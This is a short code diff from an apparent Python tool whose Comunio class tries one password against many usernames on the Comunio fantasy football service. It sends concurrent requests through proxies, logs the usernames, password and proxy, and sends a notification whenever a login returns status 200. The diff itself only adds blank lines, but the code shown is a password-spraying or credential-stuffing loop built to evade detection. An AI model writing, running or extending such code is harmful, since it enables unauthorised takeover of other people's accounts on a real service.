@@ -59,9 +59,11 @@ class Comunio(UserAccount):
                     for i, future in enumerate(as_completed(future_response)):
                         user = future_response[future]
                         statuscode = future.result().status_code
+
                         if (self.request_counter % len(self.usernames)) == 0:
                             self.logger.info("response code: {} from comunio with username: {}, password: {}, proxy: {}"
                                          .format(statuscode, user, password, self.session.proxies['http']))
+
                         if statuscode == 200:
                             self.send_notification(username=user, password=password)
                         if statuscode == 500:
